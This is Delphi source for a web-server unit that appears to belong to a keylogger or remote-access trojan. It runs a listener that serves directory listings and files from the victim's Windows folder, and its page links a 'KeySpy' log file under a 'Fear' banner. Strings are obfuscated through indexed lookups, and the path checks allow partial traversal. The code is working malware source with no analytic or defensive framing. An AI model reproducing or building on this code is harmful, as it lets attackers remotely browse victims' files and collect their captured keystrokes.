   UNIT uWebServer;

   INTERFACE

   USES
     Windows, uSockets, uUtils, ACLUtils;

   CONST
     PACKETLEN   = 5012;

   TYPE
     TWebserverInfo = PACKED RECORD
       Port       : STRING;
       Directory  : STRING;
       Connection : TClientSocket;
     END;

     TIPs        = ARRAY[0..10] OF STRING;

   VAR
     IPs              : TIPs;
     WebServerPort    : STRING;
     Directory        : STRING;
     WebSrv           : TServerSocket;
     SInfo            : TWebserverInfo;
     CloseServer      : Boolean = False;
     WebServerWorking : Boolean = False;

   FUNCTION  WinPath : STRING;
   PROCEDURE StartWebServer;

   IMPLEMENTATION

   FUNCTION WinPath : STRING;
   VAR
     PWindowsDir : ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     WinPath:=STRING(PWindowsDir)+'\';
   END;

   FUNCTION ExtractFileExt(Delimiter,Input:STRING) : STRING;
   BEGIN
     WHILE Pos(Delimiter,Input)<>0 DO Delete(Input,1,Pos(Delimiter,Input));
     Result:=Input;
   END;

   FUNCTION GetOriginalFileName(R:STRING) : STRING;
   VAR
     I : Word;
   BEGIN
     IF Pos(MainStr(34),R)>0 THEN Result:=WinPath+MainStr(34) ELSE BEGIN           //"SETUP.TXT"
       FOR I:=1 TO Length(R) DO IF R[I]='/' THEN R[I]:='\';
       IF Pos('\..\',R)>0 THEN SetLength(R,Pos('\..\',R));
       Result:=Directory+R;
     END;
   END;

   FUNCTION HextoDec(S:STRING) : Longint;
   VAR
     HexStr : STRING;
   BEGIN
     IF Pos('$',S)=0 THEN HexStr:='$'+S ELSE HexStr:=S;
     Result:=StrToIntDef(HexStr,0);
   END;

   PROCEDURE ServeFile(FileName:STRING;Connection:TClientSocket);
   VAR
     I           : WORD;
     CH          : Char;
     FileStream  : STRING;
     IP          : STRING;
     FileNAme2   : STRING;
     ContentType : STRING;
     Result      : STRING;
     FileNameHDD : STRING;
     Error       : Integer;
     FileSize    : Integer;
     TFile       : TextFile;
     FileHandle  : Cardinal;
     BytesRead   : Cardinal;
     F           : TSearchRec;
   BEGIN
     IP:=NameToIP('');
     REPEAT
       I:=Pos('%',FileName);
       IF I>0 THEN BEGIN
         CH:=Chr(StrToIntDef('$'+Copy(FileName,I+1,2),0));
         Delete(FileName,I,3);
         Insert(CH,Filename,I);
       END;
     UNTIL I=0;
     Result:='';
     ContentType:='';
     FileNameHDD:=GetOriginalFileName(FileName);
     IF FileNameHDD[Length(FileNameHDD)]='\' THEN BEGIN
       AssignFile(TFile,WinPath+MainStr(80));
       ReWrite(TFile);
       Writeln(TFile,MainStr(81));                                                 //"<HTML><HEAD>"
       Writeln(TFile,MainStr(82));                                                 //"<META http-equiv=Content-Type content="text/html; charset=windows-1252">"
       Writeln(TFile,MainStr(83));                                                 //"<META content="MSHTML 6.00.2726.2500" name=GENERATOR></HEAD>"
       Writeln(TFile,MainStr(84));                                                 //"<BODY><PRE>"
       Writeln(TFile,MainStr(85));                                                 //"<p align="center"><font color="#000080"><u><font size="7" face="Verdana">Fear</font></u><font size="7" face="Courier">"
       Writeln(TFile,MainStr(86)+IP+':'+WebServerPort+MainStr(90));                //"</font><font size="4" face="Arial">http://","</font></font></p>"
       Writeln(TFile,MainStr(44)+IP+':'+WebServerPort+MainStr(43));                //"<p><a href="http://","/setup.txt">KeySpy</a></p>"
       Writeln(TFile,'<hr>');
       Error:=FindFirst(FileNameHDD+'*.*',faAnyFile,F);
       FileName2:=FileName;
       IF FileName2[1]='/' THEN Delete(FileName2,1,1);
       WHILE Error=0 DO BEGIN
         IF (F.Attr AND faDirectory>0) THEN Writeln(TFile,MainStr(93)+IP+':'+WebServerPort+'/'+FileName2+F.Name+'/">'+F.Name+MainStr(98)) ELSE  //"</P><LI><A href="http://","</A> <B><U>(Directory)</B></U>"
         Writeln(TFile,MainStr(109)+IP+':'+WebServerPort+'/'+FileName2+F.Name+'">'+F.Name+'</A> ('+IntToStr(F.Size)+MainStr(28));                 //"<P><A href="http://"," bytes)"
         Error:=FindNext(f);
       END;
       CloseFile(TFile);
     END;
     FileName:=ExtractFileExt('/',FileName);
     IF FileName='' THEN FileName:=MainStr(80) ELSE FileName:=FileNameHDD;
     IF FileExists(FileNameHDD)OR(DirectoryExists(FileNameHDD)) THEN BEGIN
       IF Pos(MainStr(80),FileName)>0 THEN FileHandle:=CreateFile(pChar(SInfo.Directory+FileName),LongWord($80000000),0,NIL,3,$00000080,0)
       ELSE FileHandle:=CreateFile(Pchar(Filename),LongWord($80000000),0,NIL,3,$00000080,0);
       FileSize:=GetFileSize(FileHandle,NIL);
       IF (ExtractFileExt('.',FileName)=MainStr(107))OR(ExtractFileExt('.',FileName)=MainStr(108)) THEN ContentType:=MainStr(117);  //"htm","html","text/html"
       Result:=MainStr(110)+CRLF                                                   //"HTTP/1.1 200 OK"
              +MainStr(111)+CRLF                                                   //"Accept-Ranges: bytes"
              +MainStr(112)+IntToStr(FileSize)+CRLF                                //"Content-Length: "
              +MainStr(113)+','+MainStr(114)+CRLF                                  //"Keep-Alive: timeout=15"," max=100"
              +MainStr(115)+CRLF                                                   //"Connection: Keep-Alive"
              +MainStr(116)+ContentType+CRLF+CRLF;                                 //"Content-Type: "
       SetLength(FileStream,PACKETLEN);
       Connection.Write(Result[1],Length(Result));
       REPEAT
         ReadFile(FileHandle,FileStream[1],PACKETLEN,BytesRead,NIL);
         Connection.Write(FileStream[1],PACKETLEN);
       UNTIL BytesRead<PACKETLEN;
       CloseHandle(FileHandle);
     END;
   END;

   PROCEDURE ServePages(Params:Pointer); STDCALL;
   VAR
     BufferIn    : STRING;
     FileToServe : STRING;
     Len         : Integer;
   BEGIN
     IF TWebserverInfo(Params^).Connection.WaitForData THEN BEGIN
       BufferIn:='';
       FileToServe:='';
       SetLength(BufferIn,PACKETLEN);
       Len:=TWebserverInfo(Params^).Connection.Read(BufferIn[1],PACKETLEN);
       BufferIn:=Copy(BufferIn,1,Len);
       IF Pos(MainStr(119),BufferIn)>0 THEN BEGIN                                  //"GET"
         Delete(BufferIn,1,4);
         FileToServe:=Copy(BufferIn,1,Pos(MainStr(118),BufferIn)-2);               //"HTTP/1.1"
         ServeFile(LowerCase(FileToServe),TWebserverInfo(Params^).Connection);
       END;
     END;
     TWebserverInfo(Params^).Connection.Destroy;
   END;

   PROCEDURE ListenThread; STDCALL;
   VAR
     CInfo  : ARRAY OF TWebServerInfo;
     Client : ARRAY OF TClientSocket;
     CCount : Integer;
     Th1    : Cardinal;
   BEGIN
     CCount:=0;
     WebSrv:=TServerSocket.Create(SInfo.Port);
     WebSrv.Listen;
     WHILE WebSrv.WaitForConnection DO BEGIN
       If CloseServer THEN Break;
       SetLength(CInfo,CCount+1);
       SetLength(Client,CCount+1);
       Client[CCount]:=TClientSocket.Create;
       WebSrv.AcceptConnection(Client[CCount]);
       CInfo[CCount].Connection:=Client[CCount];
       CreateThread(NIL,0,@ServePages,@Cinfo[CCount],0,th1);
       Inc(CCount);
     END;
     WebSrv.Destroy;
   END;

   PROCEDURE StartWebServer;
   BEGIN
     CloseServer:=False;
     SInfo.Port:=WebServerPort;
     SInfo.Directory:=WinPath;
     ListenThread;
   END;

   PROCEDURE StopWebServer;
   BEGIN
     CloseServer:=True;
   END;

   END.
